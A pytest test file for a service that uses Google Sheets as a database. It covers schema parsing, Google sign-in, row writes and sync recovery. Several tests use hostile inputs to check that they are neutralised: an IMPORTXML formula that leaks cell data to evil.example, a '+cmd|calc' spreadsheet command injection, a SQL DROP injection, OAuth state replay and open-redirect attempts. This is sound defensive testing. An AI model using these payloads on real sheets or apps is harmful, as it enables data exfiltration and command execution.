"""ThumbsUp Sheets: Google Sheets as a database (against a fake Google)."""

import threading
from urllib.parse import parse_qs, urlparse

import pytest
from conftest import SITE, make_user
from sqlalchemy import select

from app.db import SessionLocal
from app.models import SheetConnection, SheetOp
from app.services import sheet_schema, sheets_engine, sheets_google
from app.services.sheet_schema import SchemaError


# ====================================================================== helpers
def connect_google(c, google, sub="g-alice", email="alice@gmail.com"):
    r = c.post("/dashboard/sheets/google/start")
    assert r.status_code == 200, r.text
    state = parse_qs(urlparse(r.json()["url"]).query)["state"][0]
    r = c.get("/dashboard/sheets/google/callback", params={"state": state, "code": google.issue_code(sub, email)},
              follow_redirects=False)
    assert r.status_code == 303, r.text
    q = parse_qs(urlparse(r.headers["location"]).query)
    assert q.get("tu_sheets") == ["connected"], r.headers["location"]
    return q["account"][0]


def new_db(c, google, name="Shop data", **kw):
    conn = connect_google(c, google, **kw)
    r = c.post("/dashboard/sheets/databases", json={"name": name, "mode": "new", "connection_id": conn})
    assert r.status_code == 201, r.text
    return r.json()


def secret_key(c):
    return c.post("/dashboard/keys", json={"name": "server", "kind": "secret"}).json()["data"]["key"]


def migrate(c, key, dbid, sql, **extra):
    return c.post(f"/v1/sheets/{dbid}/migrate", json={"sql": sql, **extra}, headers={"Authorization": f"Bearer {key}"})


def flush():
    sheets_engine.flush_due(force=True)


@pytest.fixture
def setup(client, alice, google):
    d = new_db(alice, google)
    key = secret_key(alice)
    r = migrate(alice, key, d["id"], """
        -- contacts form
        CREATE TABLE contacts (
            id SERIAL PRIMARY KEY,
            name VARCHAR(100) NOT NULL,
            email EMAIL,
            age INT,
            subscribed BOOLEAN
        );""", name="001_init")
    assert r.status_code == 200 and r.json()["applied"], r.text
    return {"db": d, "key": key, "h": {"Authorization": f"Bearer {key}"}, "sid": d["spreadsheet_id"],
            "rows": f"/v1/sheets/{d['id']}/contacts/rows"}


# ====================================================================== schema detection (no Google)
def test_html_form_columns_types_and_skips():
    html = """
    <form id="contact">
      <input name="name" required>
      <input type="email" name="email" required>
      <input type="tel" name="phone">
      <input type="number" name="age">
      <input type="checkbox" name="newsletter">
      <input type="checkbox" name="topics[]" value="a"><input type="checkbox" name="topics[]" value="b">
      <input type="date" name="visit_date">
      <select name="plan"><option>a</option></select>
      <textarea name="message"></textarea>
      <input type="hidden" name="_gotcha"><input type="password" name="password">
      <input type="file" name="cv"><button type="submit">Send</button><input type="submit" value="Go">
      <input name="csrf_token"><input name="id">
    </form>
    <form name="newsletter-signup"><input type="email" name="email"></form>
    """
    out = sheet_schema.parse(html)
    assert out["kind"] == "html"
    tables = {c["table"]: c["columns"] for c in out["changes"]}
    cols = {c["name"]: c for c in tables["contact"]}
    assert list(cols) == ["name", "email", "phone", "age", "newsletter", "topics", "visit_date", "plan", "message", "csrf_token"]
    assert cols["email"]["type"] == "email" and cols["email"]["required"]
    assert cols["age"]["type"] == "number" and cols["phone"]["type"] == "phone"
    assert cols["newsletter"]["type"] == "boolean" and cols["topics"]["type"] == "text"  # checkbox group = list of choices
    assert cols["visit_date"]["type"] == "date"
    assert [c["name"] for c in tables["newsletter-signup"]] == ["email"]
    assert any("password" in w for w in out["warnings"]) and any("'id'" in w for w in out["warnings"])


def test_react_and_plain_js_code():
    code = """
    import { useState } from "react";
    export default function Signup() {
      const [form, setForm] = useState({ fullName: "", email: "", age: 0, agree: false });
      async function send() {
        const fd = new FormData(); fd.append("referrer", document.referrer);
        await fetch("/x", { method: "POST", body: JSON.stringify({ ...form, source: "landing", "utm campaign": c }) });
      }
      return <form><input name="fullName" /><input type="email" name={"email"} /></form>;
    }"""
    out = sheet_schema.parse(code)
    assert out["kind"] == "js"
    cols = {c["name"]: c["type"] for c in out["changes"][0]["columns"]}
    for name in ("fullName", "email", "age", "agree", "referrer", "source", "utm campaign"):
        assert name in cols, (name, cols)
    assert cols["email"] == "email" and cols["age"] == "number" and cols["agree"] == "boolean"


def test_json_and_csv():
    out = sheet_schema.parse('[{"name": "A", "email": "a@x.com", "joined": "2026-01-02", "vip": true, "spent": 12.5, "site": "https://a.com"}]')
    cols = {c["name"]: c["type"] for c in out["changes"][0]["columns"]}
    assert cols == {"name": "text", "email": "email", "joined": "date", "vip": "boolean", "spent": "number", "site": "url"}
    out = sheet_schema.parse('{"orders": [{"total": 3}], "customers": [{"email": "x@y.co"}]}')
    assert {c["table"] for c in out["changes"]} == {"orders", "customers"}
    out = sheet_schema.parse("name,email,score\nAnn,ann@x.com,12")
    assert [(c["name"], c["type"]) for c in out["changes"][0]["columns"]] == [("name", "text"), ("email", "email"), ("score", "number")]


def test_sql_migrations_parse_every_statement():
    sql = """
    /* v1 */ CREATE TABLE IF NOT EXISTS `orders` (id INTEGER PRIMARY KEY, total DECIMAL(10,2) NOT NULL, paid BOOL,
        placed_at TIMESTAMP, note TEXT, created_at TIMESTAMP, PRIMARY KEY (id));
    ALTER TABLE orders ADD COLUMN coupon VARCHAR(20);
    ALTER TABLE orders DROP COLUMN note, RENAME COLUMN paid TO is_paid;
    ALTER TABLE orders ALTER COLUMN coupon TYPE TEXT NOT NULL;
    ALTER TABLE orders RENAME TO purchases;
    DROP TABLE IF EXISTS old_stuff;
    """
    ops = sheet_schema.parse(sql)["changes"]
    assert ops[0]["op"] == "create_table" and [c["name"] for c in ops[0]["columns"]] == ["total", "paid", "placed_at", "note"]
    assert ops[0]["columns"][0] == {"name": "total", "type": "number", "required": True}
    assert ops[0]["columns"][2]["type"] == "datetime"
    assert [o["op"] for o in ops[1:]] == ["add_column", "drop_column", "rename_column", "alter_column", "rename_table", "drop_table"]
    with pytest.raises(SchemaError):
        sheet_schema.parse("SELECT * FROM users; DROP DATABASE x;", kind="sql")
    with pytest.raises(SchemaError):
        sheet_schema.parse("CREATE TABLE t (\"=HYPERLINK(1)\" TEXT)", kind="sql")


def test_plan_rules():
    cur = {"contacts": [{"name": "name", "type": "text", "required": False}]}
    steps = sheet_schema.plan([{"op": "create_table", "table": "Contacts", "columns": [
        {"name": "name"}, {"name": "email", "type": "email"}]}], cur, 50, 100)
    assert steps == [{"op": "add_column", "table": "contacts", "column": {"name": "email", "type": "email", "required": False}}]
    for bad in (
        [{"op": "drop_column", "table": "contacts", "column": "id"}],
        [{"op": "drop_column", "table": "contacts", "column": "nope"}],
        [{"op": "create_table", "table": "x", "columns": [{"name": "a"}, {"name": "A"}]}],
        [{"op": "rename_column", "table": "contacts", "column": "name", "to": "created_at"}],
        [{"op": "add_column", "table": "missing", "column": {"name": "x"}}],
        [{"op": "create_table", "table": "bad/name", "columns": []}],
        [{"op": "add_column", "table": "contacts", "column": {"name": "+cmd|calc"}}],
    ):
        with pytest.raises(SchemaError):
            sheet_schema.plan(bad, cur, 50, 100)
    with pytest.raises(SchemaError):
        sheet_schema.plan([{"op": "create_table", "table": "t", "columns": [{"name": f"c{i}"} for i in range(5)]}], {}, 50, 3)


def test_detect_endpoint_needs_login_and_is_read_only(client, alice):
    assert client.post("/dashboard/sheets/detect", json={"code": "<input name=a>"}).status_code == 401
    r = alice.post("/dashboard/sheets/detect", json={"code": "<form><input name='email' type='email'></form>"})
    assert r.status_code == 200 and r.json()["changes"][0]["columns"][0]["type"] == "email"
    assert alice.post("/dashboard/sheets/detect", json={"code": "nothing here"}).status_code == 422


# ====================================================================== Sign in with Google
def test_google_connect_stores_token_encrypted(client, alice, google):
    conn_id = connect_google(alice, google)
    with SessionLocal() as db:
        conn = db.get(SheetConnection, conn_id)
        assert conn.google_email == "alice@gmail.com"
        assert "rt-" not in conn.refresh_token_enc  # encrypted at rest
    listing = alice.get("/dashboard/sheets/connections").text
    assert "refresh" not in listing and "rt-" not in listing
    # connecting the same Google account again updates it instead of duplicating
    connect_google(alice, google)
    assert len(alice.get("/dashboard/sheets/connections").json()["connections"]) == 1


def test_google_callback_attacks_fail_closed(client, alice, bob, google):
    r = alice.post("/dashboard/sheets/google/start")
    state = parse_qs(urlparse(r.json()["url"]).query)["state"][0]
    url = parse_qs(urlparse(r.json()["url"]).query)
    assert url["code_challenge_method"] == ["S256"] and url["access_type"] == ["offline"]
    assert "drive.file" in url["scope"][0] and "auth/drive " not in url["scope"][0] + " "

    def err(c, **params):
        r = c.get("/dashboard/sheets/google/callback", params=params, follow_redirects=False)
        assert r.status_code == 303
        assert r.headers["location"].startswith("http://console.test/dashboard?")  # never an attacker URL
        return parse_qs(urlparse(r.headers["location"]).query).get("tu_sheets_error", [""])[0]

    # Bob replays Alice's state with his own code (login CSRF / account mix-up)
    assert err(bob, state=state, code=google.issue_code("g-bob")) == "state_mismatch"
    # forged / garbage state
    assert err(alice, state="abc", code=google.issue_code()) == "expired"
    # missing browser cookie (state stolen from a URL)
    fresh = make_user(client, "carol@example.com")
    assert err(fresh, state=state, code=google.issue_code()) == "state_mismatch"
    # user said no
    assert err(alice, state=state, error="access_denied") == "cancelled"
    # user unticked the Drive permission: token is revoked and nothing is stored
    # (every failed callback deletes the one-time browser cookie, so start again)
    state = parse_qs(urlparse(alice.post("/dashboard/sheets/google/start").json()["url"]).query)["state"][0]
    code = google.issue_code(scope="openid email")
    assert err(alice, state=state, code=code) == "permission_missing"
    assert google.revoked and alice.get("/dashboard/sheets/connections").json()["connections"] == []
    # after logout an old state can't be used
    state = parse_qs(urlparse(alice.post("/dashboard/sheets/google/start").json()["url"]).query)["state"][0]
    alice.post("/dashboard/auth/logout")
    assert err(alice, state=state, code=google.issue_code()) == "not_logged_in"


# ====================================================================== tables, rows, columns
def test_create_table_lays_out_header_and_removes_placeholder(setup, google):
    tabs = [t["title"] for t in google.sheets[setup["sid"]]["tabs"]]
    assert tabs == ["contacts"]  # empty "Sheet1" was removed
    assert google.values(setup["sid"], "contacts") == [["id", "name", "email", "age", "subscribed", "created_at", "updated_at"]]


def test_insert_read_update_delete(setup, client, google):
    h, rows = setup["h"], setup["rows"]
    r = client.post(rows, json={"name": "Ann", "email": "ann@x.com", "age": "34", "subscribed": "on"}, headers=h)
    assert r.status_code == 201, r.text
    row = r.json()["row"]
    assert row["age"] == 34 and row["subscribed"] is True and row["id"].startswith("r")
    flush()
    sheet = google.values(setup["sid"], "contacts")
    assert sheet[1][:5] == [row["id"], "Ann", "ann@x.com", 34, True]

    got = client.get(rows, headers=h).json()
    assert got["total"] == 1 and got["rows"][0]["name"] == "Ann"
    r = client.patch(f"{rows}/{row['id']}?wait=true", json={"age": 35}, headers=h)
    assert r.status_code == 200 and r.json()["synced"] is True
    assert google.values(setup["sid"], "contacts")[1][3] == 35
    r = client.delete(f"{rows}/{row['id']}?wait=true", headers=h)
    assert r.json() == {"deleted": True, "synced": True}
    assert google.values(setup["sid"], "contacts") == [["id", "name", "email", "age", "subscribed", "created_at", "updated_at"]]
    assert client.get(f"{rows}/{row['id']}", headers=h).status_code == 404


def test_validation_is_all_or_nothing(setup, client, google):
    h, rows = setup["h"], setup["rows"]
    bad = [
        ({"name": "A", "email": "not-an-email"}, "invalid_value"),
        ({"email": "a@b.co"}, "missing_value"),
        ({"name": "A", "age": "twelve"}, "invalid_value"),
        ({"name": "A", "hacker": 1}, "unknown_column"),
        ({"name": {"nested": 1}}, "invalid_value"),
        ({"name": "x" * 50_001}, "value_too_long"),
    ]
    for body, code in bad:
        r = client.post(rows, json=body, headers=h)
        assert r.status_code == 422 and r.json()["error"]["code"] == code, (body, r.text)
    r = client.post(rows, json={"rows": [{"name": "ok"}, {"name": "B", "email": "nope"}]}, headers=h)
    assert r.status_code == 422
    r = client.post(rows, json={"rows": [{"name": "x"}] * 501}, headers=h)
    assert r.status_code == 422 and r.json()["error"]["code"] == "too_many_rows"
    flush()
    assert client.get(rows, headers=h).json()["total"] == 0
    assert len(google.values(setup["sid"], "contacts")) == 1


def test_formulas_are_stored_as_plain_text(setup, client, google):
    payload = '=IMPORTXML("https://evil.example/?"&A1,"//x")'
    r = client.post(setup["rows"] + "?wait=true", json={"name": payload}, headers=setup["h"])
    assert r.json()["synced"]
    assert google.values(setup["sid"], "contacts")[1][1] == payload  # RAW input: text, not a formula
    assert client.get(setup["rows"], headers=setup["h"]).json()["rows"][0]["name"] == payload


@pytest.fixture
def no_key_limit(monkeypatch):
    from app.config import settings

    monkeypatch.setattr(settings, "SECRET_KEY_RATE_PER_MINUTE", 100_000)


def test_many_writes_are_batched_into_few_google_calls(setup, client, google, no_key_limit):
    google.calls.clear()
    for i in range(300):
        assert client.post(setup["rows"], json={"name": f"P{i}", "age": i}, headers=setup["h"]).status_code == 201
    r = client.post(setup["rows"], json={"rows": [{"name": f"B{i}"} for i in range(200)]}, headers=setup["h"])
    assert r.json()["count"] == 200
    assert google.calls == []  # nothing sent yet: answered from our copy
    flush()
    assert google.count("write") == 1 and google.count("read") == 1  # 500 rows = 1 append + 1 header read
    values = google.values(setup["sid"], "contacts")
    assert len(values) == 501 and len({v[0] for v in values[1:]}) == 500


def test_queue_coalesces_changes_to_the_same_row(setup, client, google):
    h, rows = setup["h"], setup["rows"]
    keep = client.post(rows, json={"name": "Keep"}, headers=h).json()["row"]
    client.patch(f"{rows}/{keep['id']}", json={"age": 1}, headers=h)
    client.patch(f"{rows}/{keep['id']}", json={"age": 2, "email": "k@x.com"}, headers=h)
    gone = client.post(rows, json={"name": "Gone"}, headers=h).json()["row"]
    client.delete(f"{rows}/{gone['id']}", headers=h)
    google.calls.clear()
    flush()
    assert google.count("write") == 1  # just one append, with the final values
    v = google.values(setup["sid"], "contacts")
    assert len(v) == 2 and v[1][1:4] == ["Keep", "k@x.com", 2]


def test_delete_middle_column_shifts_the_rest_left(setup, client, google):
    h = setup["h"]
    client.post(setup["rows"] + "?wait=true", json={"rows": [
        {"name": "Ann", "email": "a@x.com", "age": 30, "subscribed": True},
        {"name": "Bob", "email": "b@x.com", "age": 40, "subscribed": False}]}, headers=h)
    r = migrate(client, setup["key"], setup["db"]["id"], "ALTER TABLE contacts DROP COLUMN email")
    assert r.status_code == 200, r.text
    v = google.values(setup["sid"], "contacts")
    assert v[0] == ["id", "name", "age", "subscribed", "created_at", "updated_at"]  # age moved from D to C
    assert v[1][1:4] == ["Ann", 30, True] and v[2][1:4] == ["Bob", 40, False]
    rows = client.get(setup["rows"], headers=h).json()["rows"]
    assert "email" not in rows[0] and rows[0]["age"] == 30
    # and writes after the change land in the right columns
    client.post(setup["rows"] + "?wait=true", json={"name": "Cy", "age": 50}, headers=h)
    assert google.values(setup["sid"], "contacts")[3][1:3] == ["Cy", 50]


def test_add_rename_move_columns_from_dashboard(setup, alice, google):
    d = alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()
    t = d["tables"][0]
    alice.post(setup["rows"] + "?wait=true", json={"name": "Ann", "age": 3}, headers=setup["h"])
    r = alice.post(f"/dashboard/sheets/tables/{t['id']}/columns", json={"name": "city", "type": "text", "position": 1})
    assert r.status_code == 201, r.text
    assert google.values(setup["sid"], "contacts")[0][:4] == ["id", "name", "city", "email"]
    r = alice.patch(f"/dashboard/sheets/tables/{t['id']}/columns", json={"column": "name", "new_name": "full name", "position": 3})
    assert r.status_code == 200, r.text
    header = google.values(setup["sid"], "contacts")[0]
    assert header[:6] == ["id", "city", "email", "age", "full name", "subscribed"]
    row = google.values(setup["sid"], "contacts")[1]
    assert row[header.index("full name")] == "Ann" and row[header.index("age")] == 3
    cols = [c["name"] for c in alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()["tables"][0]["columns"]]
    assert cols == ["city", "email", "age", "full name", "subscribed"]
    r = alice.delete(f"/dashboard/sheets/tables/{t['id']}/columns", params={"name": "city"})
    assert r.status_code == 200 and google.values(setup["sid"], "contacts")[0][1] == "email"
    assert alice.delete(f"/dashboard/sheets/tables/{t['id']}/columns", params={"name": "id"}).status_code == 422


def test_apply_code_from_dashboard_adds_only_missing_columns(setup, alice, google):
    form = '<form id="contacts"><input name="name"><input name="email" type="email"><input name="company"></form>'
    db_id = setup["db"]["id"]
    r = alice.post(f"/dashboard/sheets/databases/{db_id}/schema", json={"code": form, "dry_run": True})
    assert r.json()["descriptions"] == ["Add column 'company' (text) to 'contacts'"] and not r.json()["applied"]
    assert "company" not in google.values(setup["sid"], "contacts")[0]
    r = alice.post(f"/dashboard/sheets/databases/{db_id}/schema", json={"code": form})
    assert r.json()["applied"] and "company" in google.values(setup["sid"], "contacts")[0]
    r = alice.post(f"/dashboard/sheets/databases/{db_id}/schema", json={"code": form})  # pasting again: nothing to do
    assert r.json()["steps"] == []


def test_named_migrations_run_once(setup, client, google):
    google.calls.clear()
    r = migrate(client, setup["key"], setup["db"]["id"], "CREATE TABLE contacts (name TEXT)", name="001_init")
    assert r.json()["skipped"] and google.calls == []
    r = migrate(client, setup["key"], setup["db"]["id"], "CREATE TABLE orders (total NUMBER NOT NULL)", name="002", dry_run=True)
    assert r.json()["descriptions"] and [t["title"] for t in google.sheets[setup["sid"]]["tabs"]] == ["contacts"]


def test_delete_every_row_works_with_frozen_header(setup, client, google):
    ids = [r["id"] for r in client.post(setup["rows"] + "?wait=true", json={"rows": [{"name": "a"}, {"name": "b"}]},
                                         headers=setup["h"]).json()["rows"]]
    for i in ids:
        client.delete(f"{setup['rows']}/{i}", headers=setup["h"])
    flush()
    assert google.values(setup["sid"], "contacts") == [["id", "name", "email", "age", "subscribed", "created_at", "updated_at"]]
    with SessionLocal() as db:
        assert not db.scalars(select(SheetOp).where(SheetOp.status != "done")).all()
    client.post(setup["rows"] + "?wait=true", json={"name": "c"}, headers=setup["h"])
    assert google.values(setup["sid"], "contacts")[1][1] == "c"


def test_sort_filter_search_paginate(setup, client):
    client.post(setup["rows"], json={"rows": [{"name": n, "age": a, "email": f"{n.lower()}@x.com"}
                                               for n, a in [("Cara", 30), ("Abe", 50), ("Bea", 40)]]}, headers=setup["h"])
    flush()
    get = lambda q: client.get(setup["rows"] + q, headers=setup["h"]).json()  # noqa: E731
    assert [r["name"] for r in get("?sort=age&order=desc")["rows"]] == ["Abe", "Bea", "Cara"]
    assert [r["name"] for r in get("?filter[email]=BEA@x.com")["rows"]] == ["Bea"]
    assert [r["name"] for r in get("?search=ab")["rows"]] == ["Abe"]
    page = get("?limit=2&offset=1")
    assert page["total"] == 3 and [r["name"] for r in page["rows"]] == ["Abe", "Bea"]
    assert client.get(setup["rows"] + "?filter[password]=x", headers=setup["h"]).status_code == 422


# ====================================================================== people editing the sheet by hand
def test_hand_edits_in_google_are_followed(setup, client, google):
    h, sid = setup["h"], setup["sid"]
    client.post(setup["rows"] + "?wait=true", json={"name": "Ann"}, headers=h)
    tab = google.tab(sid, "contacts")
    tab["rows"][0].insert(5, "notes")  # someone adds a column "notes" by hand
    for r in tab["rows"][1:]:
        r.insert(5, "")
    tab["rows"].append(["", "Typed by hand", "", 9, "", "a note"])  # and a row without an id
    tab["rows"].append(list(tab["rows"][1]))  # and copy-pastes Ann's row (duplicate id)
    rows = client.get(setup["rows"], headers=h).json()["rows"]
    assert len(rows) == 3 and len({r["id"] for r in rows}) == 3
    hand = next(r for r in rows if r["name"] == "Typed by hand")
    assert hand["notes"] == "a note" and hand["age"] == 9
    assert google.values(sid, "contacts")[2][0] == hand["id"]  # id written back into the sheet
    # the new column can be written through the API
    r = client.patch(f"{setup['rows']}/{hand['id']}?wait=true", json={"notes": "edited"}, headers=h)
    assert r.status_code == 200 and google.values(sid, "contacts")[2][5] == "edited"


def test_deleted_id_column_and_renamed_tab_are_repaired(setup, client, google):
    h, sid = setup["h"], setup["sid"]
    client.post(setup["rows"] + "?wait=true", json={"name": "Ann"}, headers=h)
    tab = google.tab(sid, "contacts")
    for r in tab["rows"]:
        del r[0]  # someone deletes column A (id)
    tab["title"] = "People"  # and renames the tab
    rows = client.get(setup["rows"], headers=h).json()["rows"]  # old name still works
    assert rows[0]["name"] == "Ann" and rows[0]["id"]
    v = google.values(sid, "People")
    assert v[0][-1] == "id" and v[1][-1] == rows[0]["id"]
    assert client.get(f"/v1/sheets/{setup['db']['id']}/People/rows", headers=h).status_code == 200
    google.sheets[sid]["tabs"].append({"gid": 1, "title": "other", "rows": [], "frozen": 0})
    google.sheets[sid]["tabs"].remove(tab)  # tab deleted in Google
    assert client.get(f"/v1/sheets/{setup['db']['id']}/People/rows", headers=h).status_code == 404


# ====================================================================== connecting existing sheets
def test_existing_sheet_needs_picker_then_adopts_tabs(client, alice, google):
    conn = connect_google(alice, google)
    sid = google.make_sheet("g-alice", "Leads", {"Leads": [["Name", "Email"], ["Ann", "a@x.com"]], "Empty": []})
    link = f"https://docs.google.com/spreadsheets/d/{sid}/edit#gid=0"
    google.sheets[sid]["access"].discard("g-alice")  # drive.file: not picked through ThumbsUp yet
    r = alice.post("/dashboard/sheets/databases", json={"name": "Leads", "mode": "existing", "connection_id": conn, "spreadsheet": link})
    assert r.status_code == 403 and r.json()["error"]["code"] == "not_picked"
    google.grant(sid, "g-alice")  # picked with Google's file picker
    r = alice.post("/dashboard/sheets/databases", json={"name": "Leads", "mode": "existing", "connection_id": conn, "spreadsheet": link})
    assert r.status_code == 201, r.text
    d = r.json()
    assert [t["name"] for t in d["tables"]] == ["Leads"]  # the empty tab is ignored
    key = secret_key(alice)
    rows = alice.get(f"/v1/sheets/{d['id']}/leads/rows", headers={"Authorization": f"Bearer {key}"}).json()["rows"]
    assert rows[0]["Name"] == "Ann"
    assert google.values(sid, "Leads")[0] == ["Name", "Email", "id"]  # id added at the END, layout untouched
    r = alice.post("/dashboard/sheets/databases", json={"name": "x", "mode": "existing", "connection_id": conn, "spreadsheet": link})
    assert r.json()["error"]["code"] == "already_connected"


def test_robot_mode_requires_share_and_title_code(client, alice, bob, google):
    sid = google.make_sheet("g-owner", "Orders", {"Orders": [["Item", "Qty"]]})
    link = f"https://docs.google.com/spreadsheets/d/{sid}/edit"
    r = alice.post("/dashboard/sheets/databases", json={"name": "Orders", "mode": "robot", "spreadsheet": link})
    assert r.status_code == 403 and "robot@thumbsup-test" in r.json()["error"]["message"]
    google.grant(sid, "robot")
    d = alice.post("/dashboard/sheets/databases", json={"name": "Orders", "mode": "robot", "spreadsheet": link}).json()
    assert d["status"] == "needs_verification" and d["verification_code"].startswith("tu-")
    assert d["spreadsheet_title"] == "" and "Orders" not in alice.get(f"/dashboard/sheets/databases/{d['id']}/events").text
    key = secret_key(alice)
    r = alice.post(f"/v1/sheets/{d['id']}/migrate", json={"sql": "CREATE TABLE x (a TEXT)"}, headers={"Authorization": f"Bearer {key}"})
    assert r.status_code == 409
    assert alice.post(f"/dashboard/sheets/databases/{d['id']}/verify").json()["error"]["code"] == "code_not_found"
    # Bob tries to claim the same sheet: his code is different and Alice's doesn't work for him
    bd = bob.post("/dashboard/sheets/databases", json={"name": "Mine", "mode": "robot", "spreadsheet": link}).json()
    assert bd["verification_code"] != d["verification_code"]
    google.sheets[sid]["title"] = f"Orders {d['verification_code']}"
    assert bob.post(f"/dashboard/sheets/databases/{bd['id']}/verify").json()["error"]["code"] == "code_not_found"
    r = alice.post(f"/dashboard/sheets/databases/{d['id']}/verify")
    assert r.json()["status"] == "active" and [t["name"] for t in r.json()["tables"]] == ["Orders"]
    google.sheets[sid]["title"] = f"Orders {bd['verification_code']}"
    assert bob.post(f"/dashboard/sheets/databases/{bd['id']}/verify").json()["error"]["code"] == "sheet_taken"
    r = bob.post("/dashboard/sheets/databases", json={"name": "again", "mode": "robot", "spreadsheet": link})
    assert r.json()["error"]["code"] in ("sheet_taken", "already_connected")


# ====================================================================== website forms
def test_website_form_submissions(setup, client, alice, bob, google):
    pk = alice.post("/dashboard/keys", json={"name": "site", "kind": "public", "allowed_origins": [SITE]}).json()["data"]["key"]
    t = alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()["tables"][0]
    url = t["submit_url"].replace("http://localhost:8001", "")
    form = {"public_key": pk, "name": "Visitor", "email": "v@x.com", "subscribed": "on", "submit": "Send", "_gotcha": ""}
    r = client.post(url, data=form, headers={"Origin": SITE})
    assert r.status_code == 403 and r.json()["error"]["code"] == "public_insert_disabled"
    alice.patch(f"/dashboard/sheets/tables/{t['id']}", json={"allow_public_insert": True})
    r = client.post(url, data=form, headers={"Origin": SITE})
    assert r.status_code == 200 and r.json()["ok"], r.text  # unknown "submit" field ignored
    assert client.post(url, data=form, headers={"Origin": "https://evil.example"}).status_code == 403
    assert client.post(url, data={**form, "_gotcha": "bot"}, headers={"Origin": SITE}).json() == {"ok": True}
    r = client.post(url, data={**form, "_redirect": "https://evil.example/x"}, headers={"Origin": SITE}, follow_redirects=False)
    assert r.status_code == 200  # never redirects to a site that isn't allowed
    r = client.post(url, data={**form, "_redirect": SITE + "/thanks"}, headers={"Origin": SITE}, follow_redirects=False)
    assert r.status_code == 303 and r.headers["location"] == SITE + "/thanks"
    bob_pk = bob.post("/dashboard/keys", json={"name": "s", "kind": "public", "allowed_origins": [SITE]}).json()["data"]["key"]
    assert client.post(url, data={**form, "public_key": bob_pk}, headers={"Origin": SITE}).status_code == 404
    sk = setup["key"]
    assert client.post(url, data={**form, "public_key": sk}, headers={"Origin": SITE}).status_code == 401  # secret keys never in browsers
    r = client.post(url, data={"public_key": pk, "foo": "bar"}, headers={"Origin": SITE})
    assert r.status_code == 422 and r.json()["error"]["code"] == "no_matching_fields"
    flush()
    names = [v[1] for v in google.values(setup["sid"], "contacts")[1:]]
    assert names == ["Visitor"] * 3  # 3 real submissions; the bot, wrong sites and wrong keys added nothing
    for _ in range(30):
        last = client.post(url, data=form, headers={"Origin": SITE})
    assert last.status_code == 429


# ====================================================================== failures
def test_access_removed_keeps_writes_and_resumes_after_reconnect(setup, client, alice, google):
    h = setup["h"]
    google.refresh.clear()  # the customer removed ThumbsUp in their Google account settings
    sheets_google._access_cache.clear()
    client.post(setup["rows"], json={"name": "Waiting"}, headers=h)
    flush()
    d = alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()
    assert d["status"] == "no_access" and d["pending_writes"] == 1
    assert alice.get("/dashboard/sheets/connections").json()["connections"][0]["status"] == "revoked"
    assert client.post(setup["rows"], json={"name": "New"}, headers=h).json()["error"]["code"] == "no_access"
    connect_google(alice, google)  # reconnects the same Google account
    flush()
    assert [v[1] for v in google.values(setup["sid"], "contacts")[1:]] == ["Waiting"]
    assert alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()["status"] == "active"


def test_google_busy_is_retried_not_lost(setup, client, google):
    client.post(setup["rows"], json={"name": "Retry me"}, headers=setup["h"])
    google.fail_next = [429, 503, 500, 429]  # all four tries of the first call fail
    flush()
    with SessionLocal() as db:
        op = db.scalars(select(SheetOp)).one()
        assert op.status == "pending" and op.attempts == 1 and op.next_attempt_at is not None
    flush()
    assert google.values(setup["sid"], "contacts")[1][1] == "Retry me"


def test_permanent_google_error_marks_write_failed(setup, client, alice, google):
    client.post(setup["rows"], json={"name": "x"}, headers=setup["h"])
    google.fail_next = [400, 400]
    flush()
    d = alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()
    assert d["failed_writes"] == 1
    events = alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}/events").json()["events"]
    assert any(e["kind"] == "sync_error" for e in events)
    assert alice.post(f"/dashboard/sheets/databases/{setup['db']['id']}/retry").json()["retried"] == 1
    flush()
    assert google.values(setup["sid"], "contacts")[1][1] == "x"


def test_speed_limit_budget():
    sheets_google.budget.reset()
    for _ in range(3):
        sheets_google.budget.take("acct:write", 3, 0)
    with pytest.raises(sheets_google.SheetsError) as e:
        sheets_google.budget.take("acct:write", 3, 0)
    assert e.value.temporary and e.value.status == 429
    sheets_google.budget.take("other:write", 3, 0)  # other accounts aren't affected


def test_parallel_writers_lose_nothing(setup, google, no_key_limit):
    from fastapi.testclient import TestClient

    from app.main import app

    errors = []

    def writer(n):
        c = TestClient(app)
        for i in range(25):
            r = c.post(setup["rows"], json={"name": f"t{n}-{i}"}, headers=setup["h"])
            if r.status_code != 201:
                errors.append(r.text)

    threads = [threading.Thread(target=writer, args=(n,)) for n in range(6)]
    [t.start() for t in threads]
    flusher = threading.Thread(target=lambda: [flush() for _ in range(5)])
    flusher.start()
    [t.join() for t in threads]
    flusher.join()
    flush()
    assert not errors
    v = google.values(setup["sid"], "contacts")[1:]
    assert len(v) == 150 and len({r[0] for r in v}) == 150


def test_disconnect_revokes_token(setup, alice, google):
    conn = alice.get("/dashboard/sheets/connections").json()["connections"][0]
    assert alice.delete(f"/dashboard/sheets/connections/{conn['id']}").status_code == 200
    assert google.revoked
    assert alice.get(f"/dashboard/sheets/databases/{setup['db']['id']}").json()["status"] == "no_access"


# ====================================================================== other accounts
def test_other_accounts_cannot_touch_anything(setup, client, alice, bob, google):
    bob_key = secret_key(bob)
    bh = {"Authorization": f"Bearer {bob_key}"}
    dbid = setup["db"]["id"]
    row = client.post(setup["rows"], json={"name": "secret"}, headers=setup["h"]).json()["row"]
    t = alice.get(f"/dashboard/sheets/databases/{dbid}").json()["tables"][0]
    for method, url, body in [
        ("GET", f"/v1/sheets/{dbid}", None),
        ("GET", setup["rows"], None),
        ("GET", f"{setup['rows']}/{row['id']}", None),
        ("POST", setup["rows"], {"name": "x"}),
        ("PATCH", f"{setup['rows']}/{row['id']}", {"name": "x"}),
        ("DELETE", f"{setup['rows']}/{row['id']}", None),
        ("POST", f"/v1/sheets/{dbid}/migrate", {"sql": "DROP TABLE contacts"}),
        ("GET", f"/v1/sheets/{dbid}/{t['id']}/rows", None),
    ]:
        r = client.request(method, url, json=body, headers=bh)
        assert r.status_code == 404, (method, url, r.status_code)
    # Bob's own database can't reach Alice's table by its id
    bdb = new_db(bob, google, name="Bob", sub="g-bob", email="bob@gmail.com")
    assert client.get(f"/v1/sheets/{bdb['id']}/{t['id']}/rows", headers=bh).status_code == 404
